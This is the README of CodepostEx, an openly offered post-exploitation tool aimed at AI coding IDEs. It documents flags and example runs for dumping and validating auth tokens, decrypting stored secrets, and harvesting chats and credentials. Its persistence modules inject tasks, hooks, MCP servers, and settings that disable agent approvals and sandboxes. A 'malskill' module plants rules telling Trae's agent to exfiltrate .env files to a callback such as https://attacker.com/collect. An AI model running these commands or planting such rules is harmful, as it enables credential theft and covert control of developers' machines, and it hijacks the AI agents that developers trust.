# Introduction
CodepostEx is an open-source offensive security tool designed to target trusted AI IDE environments without requiring administrative privileges, enabling covert post-exploitation tactics and techniques. It supports multiple AI IDEs, including Cursor, Windsurf, Kiro, Trae, Antigravity and so on.

```
  ___         _                  _   ___     
 / __|___  __| |___ _ __  ___ __| |_| __|_ __
| (__/ _ \/ _` / -_) '_ \/ _ (_-<  _| _|\ \ /
 \___\___/\__,_\___| .__/\___/__/\__|___/_\_\   v0.2
                   |_|

         Living of The IDE (Post-Exploiatiion) 
```
> **Authorized use only.** This tool must only be used during penetration tests or red team engagements with explicit written permission from the system owner. Unauthorized use is illegal and may violate computer fraud laws in your jurisdiction.

## Requirements

- Windows 10/11 x64
- No installation required, single self-contained executable
- No administrator privileges required for any operation


## Build
Requires .NET 10 SDK to build. The published binary is fully self-contained, no runtime needed on the target.
```
PS C:\Users\Lotide> dotnet publish -c Release -r win-x64 --self-contained true -p:PublishSingleFile=true
Restore complete (0.5s)
  CodepostEx net10.0-windows win-x64 succeeded (6.0s) → bin\Release\net10.0-windows\win-x64\publish\
```

Output: `bin\Release\net10.0-windows\win-x64\publish\CodepostEx.exe`

## Usage

```
CodepostEx [flags]
```
For more information, use the following commands:
- Display the complete list of available flags (`CodepostEx -help`)
- Display usage examples (`CodepostEx -examples`)

### Targeting 

| Flag | Default | Description |
|------|---------|-------------|
| `-i, -ide` | All | Target IDE: `Cursor`, `Windsurf`, `Kiro`, `Trae`, `Antigravity`, `All` |

### Reconnaisance
Enumerate the target environment before collecting data or injecting payloads.

| Flag | Description |
|------|-------------|
| `-d, -discover` | Detect installed AI IDEs, report storage paths and version info |
| `-cu, -current-user` | Read account info and device identifiers for each detected IDE |
| `-wtl, -workspace-trust-list` | Enumerate trusted workspace paths |
| `-im, -include-metadata` | Include workspaceStorage metadata per workspace in trust output |

### Data Collection

| Flag | Description |
|------|-------------|
| `-ec, -extract-ai-chats` | Extract AI conversations |
| `-cs, -chats-since` | Filter chats to after date (`yyyy-MM-dd`) |
| `-a, -artifacts` | Collect IDE history and settings into a ZIP |
| `-s, -search` | Search: `Credentials`, `Emails`, or any free-text term (comma/space separated) |
| `-if, -interesting-files` | List sensitive files found in history |
| `-hs, -history` | Collect file-edit history snapshots into ZIP |
| `-hi, -history-interesting` | Scan history for sensitive original file paths |

### Tokens and Secrets

| Flag | Description |
|------|-------------|
| `-dt, -dump-token` | Extract IDE auth tokens from globalStorage |
| `-dc, -decode-token` | Decode JWT claims (sub, iss, aud, exp, scope) |
| `-vt, -validate-token` | Validate tokens online against IDE / Google endpoints |
| `-ds, -dump-secrets` | Decrypt extension secrets (DPAPI + AES-GCM) from `state.vscdb` |
| `-igs, -include-git-secrets` | Include `vscode.git` git-ipc-auth-token entries |

### Persistence Techniques

Five independent persistence techniques that  operate without administrator privileges and merge into existing config files or existing keys are never overwritten unless `-force` is passed.

#### Task Injection

Injects a malicious `tasks.json` into a target workspace's `.vscode/` directory. VSCode and all forks execute tasks automatically when `tasks.allowAutomaticTasks` is enabled (set by the `insecure` settings method). Requires `-workspace`.

| Flag | Description |
|------|-------------|
| `-pi, -payload-injected` | Path to the tasks.json payload to inject |
| `-w, -workspace` | Target workspace root |
| `-f, -force` | Overwrite existing `tasks.json` |

#### Hooks Persistence

Injects a `hooks.json` payload into Cursor's hooks directory. Hooks execute arbitrary shell commands on IDE lifecycle events (session start, prompt submission, tool use, etc.). Supports 21 events. Multiple events and commands can be mapped positionally with comma-separated lists.

| Flag | Description |
|------|-------------|
| `-ih, -inject-hooks` | Enable hooks injection |
| `-hsc, -hooks-scope` | `user` \| `project` \| `all-users` \| `all` |
| `-hc, -hooks-command` | Command(s); comma-sep maps one command per event positionally |
| `-he, -hooks-event` | Event(s); comma-sep; `list` to print all 21 supported events |
| `-w, -workspace` | Required for `project` and `all` scope |
| `-f, -force` | Overwrite existing hooks |


**Scopes and file paths:**

| Scope | Path written | Admin |
|-------|-------------|-------|
| `user` | `%USERPROFILE%\.cursor\hooks.json` | No |
| `project` | `<workspace>\.cursor\hooks.json` | No |
| `all-users` | `C:\ProgramData\Cursor\hooks.json` | No |
| `all` | All of the above | No |

**Supported hook events (21):** `sessionStart`, `sessionEnd`, `beforeSubmitPrompt`, `workspaceOpen`, `preToolUse`, `postToolUse`, `postToolUseFailure`, `beforeShellExecution`, `afterShellExecution`, `beforeMCPExecution`, `afterMCPExecution`, `beforeReadFile`, `afterFileEdit`, `subagentStart`, `subagentStop`, `preCompact`, `stop`, `afterAgentResponse`, `afterAgentThought`, `beforeTabFileRead`, `afterTabFileEdit`

#### MCP Server Injection

Injects a malicious Model Context Protocol server definition into the IDE's `mcp.json`. The IDE spawns the MCP server process on startup, the command runs in the IDE's process context without any user confirmation.

| Flag | Description |
|------|-------------|
| `-imcp, -inject-mcp` | Enable MCP injection |
| `-mi, -mcp-ide` | `Cursor` \| `Windsurf` \| `Kiro` \| `Trae` \| `Antigravity` \| `All` |
| `-mn, -mcp-name` | Server key name in `mcpServers` object |
| `-mc, -mcp-command` | Full command string; split on spaces into `command` + `args` |
| `-ms, -mcp-scope` | `user` \| `project` \| `all` |
| `-w, -workspace` | Required for `project` and `all` scope |
| `-f, -force` | Overwrite existing server entry with same name |


#### Insecure Settings Injection 

Injects persistence directly into `settings.json`. Three methods available; all merge into the existing file. The `insecure` method covers the broadest attack surface 61 dangerous settings that disable security controls across the IDE.

Supports: Cursor, Windsurf, Kiro, Trae, Antigravity.

| Flag | Description |
|------|-------------|
| `-iset, -inject-settings` | Enable settings injection |
| `-sm, -settings-method` | `path-poison` \| `shell-args` \| `insecure` |
| `-sp, -settings-payload` | Path (path-poison) or command (shell-args); unused by `insecure` |
| `-ss, -settings-scope` | `user` \| `workspace` \| `all` |
| `-w, -workspace` | Required for `workspace` scope |
| `-f, -force` | Overwrite existing keys |

The `insecure` method explicitly excludes `hooks` and `mcpServers` those have dedicated modules above. **Insecure** method key categories (61 keys): `workspace trust disabled`, `auto-task execution`, `terminal commands without confirmation`, `extension updates/validation disabled`, `git operations without confirmation`, `telemetry disabled`, `file access restrictions disabled`, `chat/agent sandbox disabled`, `notifications disabled`, `insecure network connections`, `uri handler restrictions disabled`, `cursor privacy disabled`, `ai agent approvals disabled`, `language validator allows malicious paths`, `search includes sensitive directories`, `editor auto-actions`.

#### Agent Rules Injection (Mallskill)

Injects malicious agent rules into Trae's project rules file (`.trae\rules\project_rules.md`). The rules instruct Trae's AI agent to silently exfiltrate `.env` file contents to an attacker-controlled callback URL on every user interaction 

| Flag | Description |
|------|-------------|
| `-mse, -malskill-exfiltration` | Enable Trae agent rules injection |
| `-mse-url, -callback-url` | Callback URL embedded in the exfiltration rules payload |
| `-w, -workspace` | Target workspace root (required) |
| `-f, -force` | Overwrite existing rules file |


### Output & Meta

| Flag | Description |
|------|-------------|
| `-html` | Generate HTML viewer alongside chat JSON |
| `-o, -output` | Output directory |
| `-sl, -silent` | Suppress all console output |
| `-h, -help` | Concise help |
| `-examples` | Usage examples |
| `-version` | Show version |

## Examples

Discover installed AI IDEs and read account or device info
```
C:\> CodepostEx -discover -cu -ide cursor
```
List trusted workspaces with metadata

```
C:\> CodepostEx -workspace-trust-list -include-metadata -ide antigravity
[+] Antigravity - 18 trusted workspace(s)
[^] C:\Users\Offsec\.gemini\antigravity\playground\final-voyager
[^] D:\Codepost
```

Extracts agent conversation history and collects artifacts that c

```
CodepostEx -ide Cursor -extract-ai-chats -artifacts -html -output C:\Loot
C:\> [*] Collecting Cursor artifacts...
[+] Cursor: 29197 entries extracted.
[*] Mapped to 58 workspace(s).
[+] Artifact files loaded: 258
[+] HTML: C:\Loot\Reports\Cursor_Report.html
```

The following are the generates a report that organizes collected credentials, sensitive information, conversations, and artifacts by workspace, providing operators with a centralized view for analyzing data collected.

| Dashboard |
|-----------|
|![Index](https://github.com/user-attachments/assets/fb5e0294-739a-4652-99c0-655b846f88f9)|

Chat, artifact, and credential counts by AI IDE, workspace file counts, and credential breakdowns by category including **supported patterns**: Cloud (`AWS Access Key`, `AWS API Key`, `AWS S3 Bucket`, `Google API Key`, `GCP OAuth`, `Google OAuth Token`, `GCP Service Account`, `Firebase`, `Azure Storage Key`, `Heroku API Key`), Database (`MongoDB`, `PostgreSQL`, `MySQL`, `Redis`, `Cassandra connection strings`), Dev Key (`GitHub Token`, `GitHub Access Token`, `OpenAI API Key`, `OpenAI Project Key`, `Anthropic API Key`), SaaS (`Slack Token`, `Slack Webhook`, `Stripe Key`, `Twilio Key`, `MailChimp Key`, `Mailgun Key`, `PayPal Token`, `Square Token`), Social (`Discord Token`, `Facebook Token`, `Twitter Token`), Crypto (`PGP Private Key`, `RSA Private Key`, `EC Private Key`, `OpenSSH Key`, `DSA Private Key`), PII (`Email addresses`), Network (`IPv4 addresses`), Generic (`JWT Token`, `Basic Auth URL`, `Auth Bearer`, `Generic API Key`, `Generic Secret`).

| Credentials | Artifacts | Chats |
|-------------|-----------|-------|
| ![Creds](https://github.com/user-attachments/assets/25b34d3b-af5c-447b-8c78-26a48fa0fa7a) | ![Art](https://github.com/user-attachments/assets/c9e919e4-5f0b-4bca-95fc-42f4369f9f82) | ![Chats](https://github.com/user-attachments/assets/2ca57f97-722a-424d-bdb6-f4aba3b3520f) |


Search chats for credentials and emails with support for predefined categories and free-text search terms.
 
```
C:\> CodepostEx -search Credentials,Emails
[*] Scanning Cursor history: C:\Users\IDE\User\History
[+] [Email] Email: redacted@email.io
[^] File: redacted.py

C:\> CodepostEx -search "github.com" -ide Cursor

```

Collect or dump and decode auth tokens

```
C:\Tools>CodepostEx -ide Cursor -dump-token -decode-token -validate-token
[*] Extracting tokens from Cursor...
[+] AccessToken
[^] Source: cursorAuth/accessToken
[^] Value: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJnb29nbGUtb2F1dGgyfH.redacted
[^] Subject: google-oauth2|user_redacted
[^] Issuer: https://authentication.cursor.sh
[^] Expires: 24/10/2026 14:02:07 +07:00
[^] Expired: False
[^] Status: Valid
[^] Online: AcceptedOnline

[+] RefreshToken
[^] Source: cursorAuth/refreshToken
[^] Value: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJnb29nbGUtb2F1dGgy.redacted
[^] Subject: google-oauth2|user_.redacted
[^] Issuer: https://authentication.cursor.sh
[^] Expires: 24/10/2026 14:02:07 +07:00
[^] Expired: False
[^] Status: Valid
[^] Online: AcceptedOnline
````

Inject Cursor hooks (Hook persistence) at user or all-user scope with multiple events (two events, two commands) 

```
CodepostEx -inject-hooks -hooks-scope all-users -hooks-event beforeSubmitPrompt,afterFileEdit -hooks-command "calc.exe,notepad.exe"
```

The following video demonstrates one of the persistence techniques

[![Watch the demo](https://img.youtube.com/vi/nPeJuF9HPv0/maxresdefault.jpg)](https://youtu.be/nPeJuF9HPv0)


Creating malskills and inject Trae agent exfiltration rules

```
CodepostEx -malskill-exfiltration -callback-url https://attacker.com/collect -workspace C:\project
```

The following commands demonstrate the full persistence chain within a trusted workspace (not recommended).

```
CodepostEx -payload-injected tasks.json -inject-mcp -mcp-scope project -inject-settings -settings-method insecure -settings-scope workspace -inject-hooks -hooks-scope project -hooks-command "powershell -enc <b64>" -workspace C:\project -force
```
